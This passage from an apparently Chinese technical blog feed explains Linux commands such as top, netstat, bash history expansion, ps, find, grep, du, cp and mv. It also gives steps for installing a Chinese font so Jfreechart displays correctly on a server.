<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>8126460 total</td>
<td>交换区总量</td>
</tr>
<tr>
<td>0 used</td>
<td>使用的交换区总量</td>
</tr>
<tr>
<td>8126460 free</td>
<td>空闲交换区总量</td>
</tr>
<tr>
<td>5577340 avail Mem</td>
<td>可用交换取总量</td>
</tr>
</tbody>
</table>
<ol start="6">
<li>
<p>第六行，空行</p>
</li>
<li>
<p>第七行以下：各进程（任务）的状态监控：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">PID <span class="token environment constant">USER</span>      PR  NI    VIRT    RES    SHR S  %CPU %MEM     TIME+ COMMAND                                                                                                                                                                     
<span class="token number">944</span> root      <span class="token number">20</span>   <span class="token number">0</span>  <span class="token number">565168</span>  <span class="token number">10532</span>   <span class="token number">7440</span> S   <span class="token number">0.7</span>  <span class="token number">0.1</span>   <span class="token number">0</span>:36.70 NetworkManager<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<table>
<thead>
<tr>
<th>参数</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>PID</td>
<td>进程id</td>
</tr>
<tr>
<td>USER</td>
<td>进程所有者</td>
</tr>
<tr>
<td>PR</td>
<td>进程优先级</td>
</tr>
<tr>
<td>NI</td>
<td>nice值。负值表示高优先级，正值表示低优先级</td>
</tr>
<tr>
<td>VIRT</td>
<td>进程使用的虚拟内存总量，单位kb。VIRT=SWAP+RES</td>
</tr>
<tr>
<td>RES</td>
<td>进程使用的、未被换出的物理内存大小，单位kb。RES=CODE+DATA</td>
</tr>
<tr>
<td>SHR</td>
<td>共享内存大小，单位kb</td>
</tr>
<tr>
<td>S</td>
<td>进程状态。D=不可中断的睡眠状态 R=运行 S=睡眠 T=跟踪/停止 Z=僵尸进程</td>
</tr>
<tr>
<td>%CPU</td>
<td>上次更新到现在的CPU时间占用百分比</td>
</tr>
<tr>
<td>%MEM</td>
<td>进程使用的物理内存百分比</td>
</tr>
<tr>
<td>TIME+</td>
<td>进程使用的CPU时间总计，单位1/100秒</td>
</tr>
<tr>
<td>COMMAND</td>
<td>进程名称（命令名/命令行）</td>
</tr>
</tbody>
</table>
</li>
</ol>
<h1>netstat：显示各种网络相关信息</h1>
<p>Netstat 命令用于显示各种网络相关信息如网络连接，路由表，接口状态，端口信息，masquerade 连接，多播成员 等等。<br>
例如：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">找出程序运行的端口：netstat -ap<span class="token operator">|</span><span class="token function">grep</span> <span class="token function">ssh</span>
找出端口运行的精细化进程: <span class="token function">netstat</span> -an<span class="token operator">|</span><span class="token function">grep</span> <span class="token string">':80'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>执行<strong>netstat</strong>后，其输出结果为</p>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20211125185454741.png" alt="image-20211125185454741"></p>
<p>从整体上看，netstat的输出结果可以分为两个部分：</p>
<p>一个是<strong>Active Internet connections</strong>，称为有源TCP连接，其中"Recv-Q"和"Send-Q"指%0A的是接收队列和发送队列。这些数字一般都应该是0。如果不是则表示软件包正在队列中堆积。这种情况只能在非常少的情况见到。</p>
<p>另一个是<strong>Active UNIX domain sockets</strong>，称为有源Unix域套接口（和网络套接字一样，但是只能用于本机通信，性能可以提高一倍）</p>
<table>
<thead>
<tr>
<th>参数</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>Proto</td>
<td>显示连接使用的协议</td>
</tr>
<tr>
<td>RefCnt</td>
<td>表示连接到本套接口上的进程号</td>
</tr>
<tr>
<td>Types</td>
<td>显示套接口的类型</td>
</tr>
<tr>
<td>State</td>
<td>显示套接口当前的状态</td>
</tr>
<tr>
<td>Path</td>
<td>表示连接到套接口的其它进程使用的路径名。</td>
</tr>
</tbody>
</table>
<p>常见参数</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token parameter variable">-a</span> <span class="token punctuation">(</span>all<span class="token punctuation">)</span>显示所有选项，默认不显示LISTEN相关
<span class="token parameter variable">-t</span> <span class="token punctuation">(</span>tcp<span class="token punctuation">)</span>仅显示tcp相关选项
<span class="token parameter variable">-u</span> <span class="token punctuation">(</span>udp<span class="token punctuation">)</span>仅显示udp相关选项
<span class="token parameter variable">-n</span> 拒绝显示别名，能显示数字的全部转化成数字。
<span class="token parameter variable">-l</span> 仅列出有在 Listen <span class="token punctuation">(</span>监听<span class="token punctuation">)</span> 的服務状态
<span class="token parameter variable">-p</span> 显示建立相关链接的程序名
<span class="token parameter variable">-r</span> 显示路由信息，路由表
<span class="token parameter variable">-e</span> 显示扩展信息，例如uid等
<span class="token parameter variable">-s</span> 按各个协议进行统计
<span class="token parameter variable">-c</span> 每隔一个固定时间，执行该netstat命令。

提示：LISTEN和LISTENING的状态只有用-a或者-l才能看到<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>实用命令实例</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">netstat</span> <span class="token parameter variable">-a</span> ：列出所有端口 <span class="token punctuation">(</span>包括监听和未监听的<span class="token punctuation">)</span> 
<span class="token function">netstat</span> <span class="token parameter variable">-at</span> ：列出所有 tcp 端口
<span class="token function">netstat</span> <span class="token parameter variable">-au</span> <span class="token builtin class-name">:</span> 列出所有 udp 端口
<span class="token function">netstat</span> <span class="token parameter variable">-p</span> <span class="token builtin class-name">:</span> 在 <span class="token function">netstat</span> 输出中显示 PID 和进程名称 

<span class="token function">netstat</span> <span class="token parameter variable">-p</span> 可以与其它开关一起使用，就可以添加 “PID/进程名称” 到 <span class="token function">netstat</span> 输出中，这样 debugging 的时候可以很方便的发现特定端口运行的程序。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h1>“！”命令</h1>
<p>! 符号在 Linux 中不但可以用作否定符号，还可以用来从历史命令记录中取出命令或不加修改的执行之前运行的命令。</p>
<table>
<thead>
<tr>
<th>命令</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>!!</td>
<td>上一条命令</td>
</tr>
<tr>
<td>!$</td>
<td>上一条命令中的最后一个参数</td>
</tr>
<tr>
<td>!:-</td>
<td>上一命令除了最后一个参数</td>
</tr>
<tr>
<td>!*</td>
<td>上一条命令中的所有参数</td>
</tr>
<tr>
<td>!str</td>
<td>最近一条以str开头的命令</td>
</tr>
<tr>
<td>!?str?</td>
<td>最近一条包含str的命令</td>
</tr>
<tr>
<td>!n</td>
<td>顺数第n条命令</td>
</tr>
<tr>
<td>!-n</td>
<td>倒数第n条命令</td>
</tr>
<tr>
<td><code>^old^new</code></td>
<td>将上一命令中的old替换为new</td>
</tr>
<tr>
<td>!!:gs/old/new</td>
<td>将上一命令中的old替换为new</td>
</tr>
<tr>
<td>!scp:gs/old/new</td>
<td>将上一scp命令中的old替换为new</td>
</tr>
<tr>
<td></td>
<td></td>
</tr>
</tbody>
</table>
<ol>
<li>
<p>执行上一条命令：<code>!!</code></p>
 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>root@hots java<span class="token punctuation">]</span><span class="token comment"># whereis java</span>
java: /usr/bin/java /usr/lib/java /etc/java /usr/share/java /opt/soft/jdk1.8.0_211/bin/java /usr/share/man/man1/java.1.gz
<span class="token punctuation">[</span>root@hots java<span class="token punctuation">]</span><span class="token comment"># !! </span>
<span class="token function">whereis</span> <span class="token function">java</span>
java: /usr/bin/java /usr/lib/java /etc/java /usr/share/java /opt/soft/jdk1.8.0_211/bin/java /usr/share/man/man1/java.1.gz
<span class="token punctuation">[</span>root@hots java<span class="token punctuation">]</span><span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>==!!代表了上一条执行的命令。可以看到，当输入两个感叹号时，它显示上条命令的同时会执行上一条命令。==当然了，通常我们还会想到使用“UP”键来完成这个事情。但是如果是基于上条命令扩充，!!就来得更加方便了。</p>
 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>root@hots java<span class="token punctuation">]</span><span class="token comment"># ExitCapture #忘记输入java</span>
bash: ExitCapture: <span class="token builtin class-name">command</span> not found<span class="token punctuation">..</span>.
<span class="token punctuation">[</span>root@hots java<span class="token punctuation">]</span><span class="token comment"># java !!</span>
<span class="token function">java</span> ExitCapture <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
</li>
<li>
<p>使用上条命令最后一个参数：<code>!$</code></p>
 <pre class="line-numbers language-java" data-language="java"><code class="language-java">root<span class="token annotation punctuation">@hots</span> java<span class="token punctuation">]</span># ls <span class="token operator">/</span>root<span class="token operator">/</span>java<span class="token operator">/</span>
<span class="token class-name">ExitCapture</span><span class="token punctuation">.</span><span class="token keyword">class</span>  <span class="token class-name">ExitCapture</span><span class="token punctuation">.</span>java  nohup<span class="token punctuation">.</span>out
<span class="token punctuation">[</span>root<span class="token annotation punctuation">@hots</span> java<span class="token punctuation">]</span># ls <span class="token operator">-</span>al <span class="token operator">!</span>$
ls <span class="token operator">-</span>al <span class="token operator">/</span>root<span class="token operator">/</span>java<span class="token operator">/</span>
total <span class="token number">16</span>
drwxr<span class="token operator">-</span>xr<span class="token operator">-</span>x<span class="token punctuation">.</span>  <span class="token number">2</span> root root   <span class="token number">72</span> <span class="token class-name">Dec</span> <span class="token number">28</span> <span class="token number">14</span><span class="token operator">:</span><span class="token number">43</span> <span class="token punctuation">.</span>
dr<span class="token operator">-</span>xr<span class="token operator">-</span>x<span class="token operator">--</span><span class="token operator">-</span><span class="token punctuation">.</span> <span class="token number">16</span> root root <span class="token number">4096</span> <span class="token class-name">Dec</span> <span class="token number">28</span> <span class="token number">14</span><span class="token operator">:</span><span class="token number">13</span> <span class="token punctuation">.</span><span class="token punctuation">.</span>
<span class="token operator">-</span>rw<span class="token operator">-</span>r<span class="token operator">--</span>r<span class="token operator">--</span><span class="token punctuation">.</span>  <span class="token number">1</span> root root  <span class="token number">934</span> <span class="token class-name">Dec</span> <span class="token number">28</span> <span class="token number">14</span><span class="token operator">:</span><span class="token number">46</span> test<span class="token punctuation">.</span>java
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
</li>
<li>
<p>使用上条命令第一个参数：<code>!^</code></p>
 <pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token punctuation">[</span>root<span class="token annotation punctuation">@hots</span> java<span class="token punctuation">]</span># ls <span class="token operator">/</span>root<span class="token operator">/</span>java<span class="token operator">/</span>
<span class="token class-name">ExitCapture</span><span class="token punctuation">.</span><span class="token keyword">class</span>  <span class="token class-name">ExitCapture</span><span class="token punctuation">.</span>java  nohup<span class="token punctuation">.</span>out
<span class="token punctuation">[</span>root<span class="token annotation punctuation">@hots</span> java<span class="token punctuation">]</span># ls <span class="token operator">-</span>al <span class="token operator">!</span><span class="token operator">^</span>
ls <span class="token operator">-</span>al <span class="token operator">/</span>root<span class="token operator">/</span>java<span class="token operator">/</span>
total <span class="token number">16</span>
drwxr<span class="token operator">-</span>xr<span class="token operator">-</span>x<span class="token punctuation">.</span>  <span class="token number">2</span> root root   <span class="token number">72</span> <span class="token class-name">Dec</span> <span class="token number">28</span> <span class="token number">14</span><span class="token operator">:</span><span class="token number">43</span> <span class="token punctuation">.</span>
dr<span class="token operator">-</span>xr<span class="token operator">-</span>x<span class="token operator">--</span><span class="token operator">-</span><span class="token punctuation">.</span> <span class="token number">16</span> root root <span class="token number">4096</span> <span class="token class-name">Dec</span> <span class="token number">28</span> <span class="token number">14</span><span class="token operator">:</span><span class="token number">13</span> <span class="token punctuation">.</span><span class="token punctuation">.</span>
<span class="token operator">-</span>rw<span class="token operator">-</span>r<span class="token operator">--</span>r<span class="token operator">--</span><span class="token punctuation">.</span>  <span class="token number">1</span> root root  <span class="token number">934</span> <span class="token class-name">Dec</span> <span class="token number">28</span> <span class="token number">14</span><span class="token operator">:</span><span class="token number">46</span> test<span class="token punctuation">.</span>java<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
</li>
<li>
<p>去掉上一条命令最后一个参数，再次执行 <code>!:-</code></p>
 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>root@hots java<span class="token punctuation">]</span><span class="token comment"># ls -al /root/java/</span>
total <span class="token number">16</span>
drwxr-xr-x.  <span class="token number">2</span> root root   <span class="token number">72</span> Dec <span class="token number">28</span> <span class="token number">14</span>:43 <span class="token builtin class-name">.</span>
dr-xr-x---. <span class="token number">16</span> root root <span class="token number">4096</span> Dec <span class="token number">28</span> <span class="token number">14</span>:13 <span class="token punctuation">..</span>
-rw-r--r--.  <span class="token number">1</span> root root  <span class="token number">934</span> Dec <span class="token number">28</span> <span class="token number">14</span>:46 test.java
-rw-------.  <span class="token number">1</span> root root  <span class="token number">369</span> Dec <span class="token number">28</span> <span class="token number">14</span>:44 nohup.out
<span class="token punctuation">[</span>root@hots java<span class="token punctuation">]</span><span class="token comment"># !:-</span>
<span class="token function">ls</span> <span class="token parameter variable">-al</span>
total <span class="token number">16</span>
drwxr-xr-x.  <span class="token number">2</span> root root   <span class="token number">72</span> Dec <span class="token number">28</span> <span class="token number">14</span>:43 <span class="token builtin class-name">.</span>
dr-xr-x---. <span class="token number">16</span> root root <span class="token number">4096</span> Dec <span class="token number">28</span> <span class="token number">14</span>:13 <span class="token punctuation">..</span>
-rw-r--r--.  <span class="token number">1</span> root root  <span class="token number">934</span> Dec <span class="token number">28</span> <span class="token number">14</span>:46 test.java<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
</li>
<li>
<p>使用上一条命令的所有参数：<code>!*</code></p>
 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>root@hots java<span class="token punctuation">]</span><span class="token comment"># finsd -name "foo.zip" # 这里特意输错了find命令</span>
bash: finsd: <span class="token builtin class-name">command</span> not found<span class="token punctuation">..</span>.
<span class="token punctuation">[</span>root@hots java<span class="token punctuation">]</span><span class="token comment"># find !*</span>
<span class="token function">find</span> <span class="token parameter variable">-name</span> <span class="token string">"foo.zip"</span>
<span class="token punctuation">[</span>root@hots java<span class="token punctuation">]</span><span class="token comment"># </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
</li>
<li>
<p>使用上条命令指定的参数：<code>![命令名]:[参数号]</code></p>
 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>root@hots java<span class="token punctuation">]</span><span class="token comment"># ls -al /root/java/</span>
total <span class="token number">16</span>
drwxr-xr-x.  <span class="token number">2</span> root root   <span class="token number">72</span> Dec <span class="token number">28</span> <span class="token number">14</span>:43 <span class="token builtin class-name">.</span>
dr-xr-x---. <span class="token number">16</span> root root <span class="token number">4096</span> Dec <span class="token number">28</span> <span class="token number">14</span>:13 <span class="token punctuation">..</span>
-rw-r--r--.  <span class="token number">1</span> root root  <span class="token number">934</span> Dec <span class="token number">28</span> <span class="token number">14</span>:46 test.java
<span class="token punctuation">[</span>root@hots java<span class="token punctuation">]</span><span class="token comment"># pwd !ls:2</span>
<span class="token builtin class-name">pwd</span> /root/java/
/root/java
<span class="token punctuation">[</span>root@hots java<span class="token punctuation">]</span><span class="token comment"># </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
</li>
<li>
<p>执行上一条以关键字开头的命令：<code>!关键字</code></p>
 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>root@hots java<span class="token punctuation">]</span><span class="token comment"># !find #执行上条以find开头的命令</span>
<span class="token function">find</span> <span class="token parameter variable">-name</span> <span class="token string">"foo.zip"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
</li>
<li>
<p>逻辑非的作用</p>
<p>这个是它最为人所熟悉的作用，例如删除除了cfg结尾以外的所有文件：<code>rm !(*.cfg)</code></p>
</li>
</ol>
<h1>PS ：显示当前进程的状态</h1>
<blockquote>
<p>ps （英文全拼：process status）命令用于显示当前进程的状态，类似于 windows 的任务管理器</p>
</blockquote>
<table>
<thead>
<tr>
<th>命令</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>aux</td>
<td>显示所有包含其他使用者的进程</td>
</tr>
<tr>
<td></td>
<td></td>
</tr>
<tr>
<td></td>
<td></td>
</tr>
</tbody>
</table>
<p><strong>Linux查看Tomcat服务</strong></p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 查看Tomcat的PID</span>
<span class="token function">ps</span> aux<span class="token operator">|</span><span class="token function">grep</span> tomcat
<span class="token comment"># 查看线程</span>
<span class="token function">ps</span> <span class="token parameter variable">-T</span> <span class="token parameter variable">-p</span> 需要查看的PID<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
]]></content>
      <categories>
        <category>操作系统</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux系统增加zysong字体</title>
    <url>/20221030/a9baf1a9.html</url>
    <content><![CDATA[<h1>背景</h1>
<p>在开发项目中，使用到了Jfreechart，在本机环境测试正常，部署到服务器上Linux，发现Jfreechart里面的中文不能正常显示。</p>
<h1>解决</h1>
<ol>
<li>首先确认你的服务器上的<code>javahome</code> ，执行命令<code> echo $JAVA_HOME</code> ,显示出java的目录</li>
<li>将zysong.ttf文件拷贝到<code>%JavaHome%/jre/lib/fonts</code>目录下 <code>zysong.ttf</code> 需要网上下载</li>
<li>在<code>%JavaHome%/jre/lib/fonts</code>目录下执行<code>"ttmkfdir -o fonts.dir"</code>命令,重新生成<code>fonts.dir</code>文件</li>
<li>确认<code>/usr/share/zh_CN/TrueType</code>目录存在,如果不存在则<code>mkdir</code>创建 ，，一般开始是没有的，所有这样执行：到<code>/usr/share/fonts</code>下，<code>mkdir zh_CN</code> 命令创建 <code>zh_CN</code>文件夹，到zh_CN目录下 <code>mkdir TrueType</code>命令创建<code>TrueType</code>文件夹</li>
<li>把<code>zysong.ttf</code>文件拷贝到<code>TrueType</code>下</li>
<li>在<code>%JavaHome%/jre/lib</code>目录下,执行<code> cp fontconfig.RedHat.3.properties.src fontconfig.properties</code></li>
<li>重新启动<code>tomcat</code>（resin等web容器）,现在再看看，中文显示正常了</li>
</ol>
]]></content>
      <categories>
        <category>操作系统</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux系统文件操作命令</title>
    <url>/20221030/44c28660.html</url>
    <content><![CDATA[<h2 id="tree：树形结构查看文件">tree：树形结构查看文件</h2>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">apt</span> <span class="token function">install</span> tree
或者
yum <span class="token function">install</span> tree<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<h2 id="du：查看文件和目录磁盘使用的空间">du：查看文件和目录磁盘使用的空间</h2>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">格式：du <span class="token punctuation">[</span>选项<span class="token punctuation">]</span> <span class="token punctuation">[</span>文件<span class="token punctuation">]</span>
参数:
    -a或-all 显示目录中个别文件的大小
    -b或-bytes 显示目录或文件大小时，以byte为单位
    -c或--total 除了显示个别目录或文件的大小外，同时也显示所有目录或文件的总和
    -k或--kilobytes 以KB<span class="token punctuation">(</span>1024bytes<span class="token punctuation">)</span>为单位输出
    -m或--megabytes 以MB为单位输出
    -s或--summarize 仅显示总计，只列出最后加总的值
    -h或--human-readable 以K，M，G为单位，提高信息的可读性
    -x或--one-file-xystem 以一开始处理时的文件系统为准，若遇上其它不同的文件系统目录则略过
    -L<span class="token operator">&lt;</span>符号链接<span class="token operator">&gt;</span>或--dereference<span class="token operator">&lt;</span>符号链接<span class="token operator">&gt;</span> 显示选项中所指定符号链接的源文件大小
    -S或--separate-dirs 显示个别目录的大小时，并不含其子目录的大小
    -X<span class="token operator">&lt;</span>文件<span class="token operator">&gt;</span>或--exclude-from<span class="token operator">=</span><span class="token operator">&lt;</span>文件<span class="token operator">&gt;</span> 在<span class="token operator">&lt;</span>文件<span class="token operator">&gt;</span>指定目录或文件
    <span class="token parameter variable">--exclude</span><span class="token operator">=</span><span class="token operator">&lt;</span>目录或文件<span class="token operator">&gt;</span> 略过指定的目录或文件
    -D或--dereference-args 显示指定符号链接的源文件大小
    -H或--si 与-h参数相同，但是K，M，G是以1000为换算单位
    -l或--count-links 重复计算硬件链接的文件。
范例：du <span class="token parameter variable">-hm</span> 目录名称<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="文件操作-find-将符合-expression-的文件列出来">文件操作-find 将符合 expression 的文件列出来</h2>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">格式 <span class="token builtin class-name">:</span> <span class="token function">find</span> <span class="token punctuation">[</span>path<span class="token punctuation">..</span>.<span class="token punctuation">]</span> <span class="token punctuation">[</span>expression<span class="token punctuation">]</span>
说明 <span class="token builtin class-name">:</span> 将符合 expression 的文件列出来。                    
  <span class="token parameter variable">-amin</span> n <span class="token builtin class-name">:</span> 在过去 n 分钟内被读取过的文件
  <span class="token parameter variable">-anewer</span> <span class="token function">file</span> <span class="token builtin class-name">:</span> 比文件 <span class="token function">file</span> 更晚被读取过的文件
  <span class="token parameter variable">-atime</span> n <span class="token builtin class-name">:</span> 在过去 n 天被读取过的文件
  <span class="token parameter variable">-cmin</span> n <span class="token builtin class-name">:</span> 在过去 n 分钟内被修改过的文件
  <span class="token parameter variable">-cnewer</span> <span class="token function">file</span> :比文件 <span class="token function">file</span> 更新的文件
  <span class="token parameter variable">-ctime</span> n <span class="token builtin class-name">:</span> 在过去 n 天过修改过的文件
  <span class="token parameter variable">-name</span> filename, <span class="token parameter variable">-iname</span> filename <span class="token builtin class-name">:</span> 符合 filename 的文件。iname 会忽略大小写
  <span class="token parameter variable">-size</span> n <span class="token builtin class-name">:</span> 档案大小 是 n 单位，b 代表 <span class="token number">512</span> 位元组的区块，c 表示字元数，k表示 kilo bytes，w 是二个位元组。
  <span class="token parameter variable">-type</span> c <span class="token builtin class-name">:</span> 档案类型是 c 的档案。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>范例:</p>
<ol>
<li>
<p>将当前目录及其子目录下所有扩展名是 c 的文件列出来。</p>
 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">find</span> <span class="token builtin class-name">.</span> <span class="token parameter variable">-name</span> <span class="token string">"*.c"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li>
<p>将当前目录及其子目录下所有最近 20 分钟内更新过的文件列出</p>
 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">find</span> <span class="token builtin class-name">.</span> <span class="token parameter variable">-cmin</span> <span class="token parameter variable">-20</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li>
<p>查找包含字符串的文件</p>
 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">find</span> /opt/Tomcat7  <span class="token parameter variable">-name</span> <span class="token string">"system.properties"</span><span class="token operator">|</span><span class="token function">xargs</span> <span class="token function">grep</span> <span class="token parameter variable">-ri</span> <span class="token string">"BASCI_SCI_UPDATE"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li>
<p>将/usr/local/backups目录下所有10天前带"."的文件删除</p>
 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">find</span> /usr/local/backups <span class="token parameter variable">-mtime</span> +10 <span class="token parameter variable">-name</span> <span class="token string">"*.*"</span> <span class="token operator">|</span><span class="token function">xargs</span> <span class="token function">rm</span> <span class="token parameter variable">-rf</span>
或者
<span class="token function">find</span> /usr/local/backups <span class="token parameter variable">-mtime</span> +10 <span class="token parameter variable">-name</span> <span class="token string">"*.*"</span> <span class="token parameter variable">-exec</span> <span class="token function">rm</span> <span class="token parameter variable">-rf</span> <span class="token punctuation">{</span><span class="token punctuation">}</span> <span class="token punctuation">\</span><span class="token punctuation">;</span>



说明： 　　
find：linux的查找命令，用户查找指定条件的文件 　　
/usr/local/backups：想要进行清理的任意目录 　　
-mtime：标准语句写法 　　
＋10：查找10天前的文件，这里用数字代表天数，＋30表示查找30天前的文件
<span class="token string">"*.*"</span>：希望查找的数据类型，<span class="token string">"*.jpg"</span>表示查找扩展名为jpg的所有文件，<span class="token string">"*"</span>表示查找所有文件，这个可以灵活运用，举一反三 　　


<span class="token parameter variable">-exec</span> <span class="token function">rm</span> <span class="token parameter variable">-rf</span> <span class="token punctuation">{</span><span class="token punctuation">}</span> <span class="token punctuation">\</span><span class="token punctuation">;</span> ：find发现的结果一次性传给exec选项，删除
<span class="token operator">|</span><span class="token function">xargs</span> <span class="token function">rm</span> <span class="token parameter variable">-rf</span> <span class="token builtin class-name">:</span> 分批次的处理删除（推荐）<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
</li>
</ol>
<h2 id="文件操作-grep：-搜索字符串命令">文件操作-grep： 搜索字符串命令</h2>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">格式：grep <span class="token punctuation">[</span>-no<span class="token punctuation">]</span> pattern files
参数：
     <span class="token parameter variable">-n</span> 显示行号
     <span class="token parameter variable">-o</span> 只显示匹配的串<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>范例：</p>
<pre class="line-numbers language-none"><code class="language-none">grep  printf *
    file1.c:   printf("\nHello\n");
    file2.c:   printf("\nSample\n");

grep -n  printf *
    file1.c:4   printf("\nHello\n");
    file2.c:9   printf("\nSample\n");

grep -o  printf *
   file1.c:   printf
   file2.c:   printf

如果搜索的串中有空格，则用引号括起来

grep "asd abc" *<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="wc：统计指定文件中的字节数、字数、行数，并将统计结果显示输出">wc：统计指定文件中的字节数、字数、行数，并将统计结果显示输出</h2>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">格式：wc <span class="token punctuation">[</span>选项<span class="token punctuation">]</span> 文件名称
选项 ：
   <span class="token parameter variable">-c</span> 统计字节数。
   <span class="token parameter variable">-l</span> 统计行数。
   <span class="token parameter variable">-m</span> 统计字符数。这个标志不能与 <span class="token parameter variable">-c</span> 标志一起使用。
   <span class="token parameter variable">-w</span> 统计字数。一个字被定义为由空白、跳格或换行字符分隔的字符串。
   <span class="token parameter variable">-L</span> 打印最长行的长度。
   <span class="token parameter variable">-help</span> 显示帮助信息
   <span class="token parameter variable">--version</span> 显示版本信息<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="cp：-源文件存在-将一个文件拷贝至另一文件，或将数个文件拷贝至另一目录">cp：(源文件存在)将一个文件拷贝至另一文件，或将数个文件拷贝至另一目录</h2>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">格式：cp <span class="token punctuation">[</span>-arf<span class="token punctuation">]</span> <span class="token builtin class-name">source</span> dest
参数:
   <span class="token parameter variable">-a</span> 将文件状态、权限等信息都照原状予以复制。
   <span class="token parameter variable">-r</span>  若 <span class="token builtin class-name">source</span> 中含有目录名，则将目录下的文件顺序拷贝至目的地。
   <span class="token parameter variable">-f</span>  若目的地已经有相同的文件名存在，则在复制前先予以删除再行复制。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>范例：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token number">1</span>. 将文件 aaa 复制一份名字为 bbb 的文件:         
   <span class="token function">cp</span> aaa bbb   
<span class="token number">2</span>. 将当前目录下的所有C程序拷贝到当前目录下的Finished 子目录中：
   <span class="token function">cp</span> *.c Finished<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="mv：-源文件不存在-将一个文件改名为另一文件，或将数个文件移至另一目录。">mv：(源文件不存在)将一个文件改名为另一文件，或将数个文件移至另一目录。</h2>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">格式： <span class="token function">mv</span> <span class="token punctuation">[</span>-i<span class="token punctuation">]</span> <span class="token builtin class-name">source</span> dest
        <span class="token function">mv</span> <span class="token punctuation">[</span>-i<span class="token punctuation">]</span> source<span class="token punctuation">..</span>. directory
参数：-i 若目的地已有同名文件，则先询问是否覆盖旧文件<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>范例：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token number">1</span>. 将文件 aaa 改名为 bbb <span class="token builtin class-name">:</span>
